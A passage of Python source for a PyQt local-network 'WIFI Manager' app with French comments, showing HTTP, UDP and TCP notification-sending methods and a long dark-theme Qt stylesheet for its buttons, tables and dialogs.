            True si envoyé avec succès, False sinon
        """
        try:
            import urllib.request
            import json
            
            print(f"[Message] Envoi HTTP POST vers {target_ip}:{port}")
            
            # Prépare les données
            data = {
                'message': message,
                'timestamp': datetime.now().isoformat(),
                'sender': 'WiFi_Manager'
            }
            
            json_data = json.dumps(data).encode('utf-8')
            
            # Crée la requête
            url = f"http://{target_ip}:{port}/notify"
            req = urllib.request.Request(url, data=json_data, headers={'Content-Type': 'application/json'})
            
            # Envoie la requête
            with urllib.request.urlopen(req, timeout=5) as response:
                print(f"[Message] HTTP réponse: {response.status}")
                return response.status == 200
        
        except Exception as e:
            print(f"[Message] Erreur lors de l'envoi HTTP: {e}")
            return False
    
    def send_multi_protocol(self, target_ip: str, message: str) -> Dict[str, bool]:
        """
        Envoie le message via plusieurs protocoles pour maximiser les chances.
        
        Args:
            target_ip: IP de l'appareil cible
            message: Message à envoyer
            
        Returns:
            Dictionnaire avec les résultats pour chaque protocole
        """
        results = {}
        
        # Essaie différents ports et protocoles
        print(f"[Message] Envoi multi-protocole vers {target_ip}")
        
        # UDP sur plusieurs ports communs
        for port in [9999, 8888, 7777, 5000]:
            results[f'UDP:{port}'] = self.send_udp_message(target_ip, message, port)
        
        # TCP sur ports communs
        for port in [9999, 8888]:
            results[f'TCP:{port}'] = self.send_tcp_message(target_ip, message, port)
        
        return results


class AppConfig:
    """Configuration globale de l'application."""
    
    # Défauts
    DEFAULT_TIMEOUT = 2  # secondes
    DEFAULT_CIDR = "192.168.1.0/24"
    DEFAULT_PING_TIMEOUT = 5  # secondes
    
    # UI
    WINDOW_TITLE = "WIFI Manager - Scan ARP"
    WINDOW_WIDTH = 1000
    WINDOW_HEIGHT = 600
    
    # Styles - Modern & Innovative UI
    STYLE_DARK = """
        /* Main Window - Gradient Background */
        QMainWindow {
            background: qlineargradient(x1:0, y1:0, x2:1, y2:1,
                stop:0 #0f0c29, stop:0.5 #302b63, stop:1 #24243e);
            color: #ffffff;
        }
        
        /* Input Fields - Glassmorphism Effect */
        QLineEdit, QTextEdit {
            background-color: rgba(45, 45, 45, 0.7);
            color: #ffffff;
            border: 2px solid rgba(100, 200, 255, 0.3);
            border-radius: 8px;
            padding: 8px 12px;
            font-size: 11pt;
            selection-background-color: #0078d4;
        }
        QLineEdit:focus, QTextEdit:focus {
            border: 2px solid #0078d4;
            background-color: rgba(45, 45, 45, 0.9);
        }
        QLineEdit::placeholder {
            color: #888888;
        }
        
        /* Buttons - Modern Gradient & Shadows */
        QPushButton {
            background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                stop:0 #0078d4, stop:1 #005a9e);
            color: white;
            border: none;
            border-radius: 8px;
            padding: 10px 16px;
            font-weight: bold;
            font-size: 10pt;
            min-height: 35px;
        }
        QPushButton:hover {
            background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                stop:0 #1084d7, stop:1 #0078d4);
        }
        QPushButton:pressed {
            background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                stop:0 #005a9e, stop:1 #004578);
            padding-top: 12px;
            padding-bottom: 8px;
        }
        QPushButton:disabled {
            background: #3d3d3d;
            color: #888888;
        }
        
        /* Special Button Colors */
        QPushButton[text*="Kick"] {
            background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                stop:0 #dc3545, stop:1 #c82333);
        }
        QPushButton[text*="Kick"]:hover {
            background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                stop:0 #e74c5c, stop:1 #dc3545);
        }
        QPushButton[text*="Stop"] {
            background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                stop:0 #ffc107, stop:1 #ff9800);
        }
        QPushButton[text*="Stop"]:hover {
            background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                stop:0 #ffd54f, stop:1 #ffc107);
        }
        QPushButton[text*="Export"] {
            background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                stop:0 #28a745, stop:1 #218838);
        }
        QPushButton[text*="Export"]:hover {
            background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                stop:0 #48c765, stop:1 #28a745);
        }
        QPushButton[text*="TV Remote"], QPushButton[text*="Send Message"] {
            background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                stop:0 #9c27b0, stop:1 #7b1fa2);
        }
        QPushButton[text*="TV Remote"]:hover, QPushButton[text*="Send Message"]:hover {
            background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                stop:0 #ba68c8, stop:1 #9c27b0);
        }
        
        /* Table - Modern Card Style */
        QTableWidget {
            background-color: rgba(30, 30, 30, 0.8);
            color: #ffffff;
            border: none;
            border-radius: 10px;
            gridline-color: rgba(100, 100, 100, 0.3);
            font-size: 10pt;
            padding: 5px;
        }
        QTableWidget::item {
            padding: 8px;
            border-bottom: 1px solid rgba(100, 100, 100, 0.2);
        }
        QTableWidget::item:selected {
            background-color: rgba(0, 120, 212, 0.5);
            color: #ffffff;
        }
        QTableWidget::item:hover {
            background-color: rgba(100, 100, 100, 0.2);
        }
        
        /* Table Header - Gradient */
        QHeaderView::section {
            background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                stop:0 #3d3d3d, stop:1 #2d2d2d);
            color: #ffffff;
            padding: 10px;
            border: none;
            border-right: 1px solid rgba(100, 100, 100, 0.3);
            font-weight: bold;
            font-size: 10pt;
        }
        QHeaderView::section:hover {
            background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                stop:0 #4d4d4d, stop:1 #3d3d3d);
        }
        
        /* Labels - Enhanced Typography */
        QLabel {
            color: #ffffff;
            font-size: 10pt;
            padding: 2px;
        }
        
        /* CheckBox - Modern Style */
        QCheckBox {
            color: #ffffff;
            spacing: 8px;
            font-size: 10pt;
        }
        QCheckBox::indicator {
            width: 20px;
            height: 20px;
            border-radius: 4px;
            border: 2px solid #0078d4;
            background-color: rgba(45, 45, 45, 0.7);
        }
        QCheckBox::indicator:checked {
            background-color: #0078d4;
            border: 2px solid #0078d4;
            image: url(none);
        }
        QCheckBox::indicator:hover {
            border: 2px solid #1084d7;
        }
        
        /* SpinBox - Modern Style */
        QSpinBox {
            background-color: rgba(45, 45, 45, 0.7);
            color: #ffffff;
            border: 2px solid rgba(100, 200, 255, 0.3);
            border-radius: 6px;
            padding: 6px;
            font-size: 10pt;
        }
        QSpinBox:focus {
            border: 2px solid #0078d4;
        }
        QSpinBox::up-button, QSpinBox::down-button {
            background-color: rgba(0, 120, 212, 0.7);
            border: none;
            width: 20px;
            border-radius: 3px;
        }
        QSpinBox::up-button:hover, QSpinBox::down-button:hover {
            background-color: #0078d4;
        }
        
        /* ComboBox - Modern Dropdown */
        QComboBox {
            background-color: rgba(45, 45, 45, 0.7);
            color: #ffffff;
            border: 2px solid rgba(100, 200, 255, 0.3);
            border-radius: 6px;
            padding: 6px 10px;
            font-size: 10pt;
        }
        QComboBox:focus {
            border: 2px solid #0078d4;
        }
        QComboBox::drop-down {
            border: none;
            width: 30px;
        }
        QComboBox QAbstractItemView {
            background-color: #2d2d2d;
            color: #ffffff;
            border: 2px solid #0078d4;
            selection-background-color: #0078d4;
            border-radius: 4px;
        }
        
        /* ListWidget - Modern List */
        QListWidget {
            background-color: rgba(45, 45, 45, 0.8);
            color: #ffffff;
            border: 2px solid rgba(100, 200, 255, 0.3);
            border-radius: 8px;
            padding: 5px;
            font-size: 10pt;
        }
        QListWidget::item {
            padding: 10px;
            border-radius: 4px;
            margin: 2px;
        }
        QListWidget::item:selected {
            background-color: #0078d4;
        }
        QListWidget::item:hover {
            background-color: rgba(100, 100, 100, 0.3);
        }
        
        /* Dialog - Modern Modal */
        QDialog {
            background: qlineargradient(x1:0, y1:0, x2:1, y2:1,
                stop:0 #1e1e1e, stop:1 #2d2d2d);
            border-radius: 10px;
        }
        
        /* StatusBar - Sleek Bottom Bar */
        QStatusBar {
            background-color: rgba(30, 30, 30, 0.9);
            color: #00ff00;
            font-size: 10pt;
            border-top: 1px solid rgba(100, 200, 255, 0.3);
        }
        
        /* ScrollBar - Modern Minimal */
        QScrollBar:vertical {
            background-color: rgba(45, 45, 45, 0.5);
            width: 12px;
            border-radius: 6px;
        }
        QScrollBar::handle:vertical {
            background-color: rgba(0, 120, 212, 0.7);
            border-radius: 6px;
            min-height: 20px;
        }
        QScrollBar::handle:vertical:hover {
            background-color: #0078d4;
        }
        QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical {
            height: 0px;
        }
    """

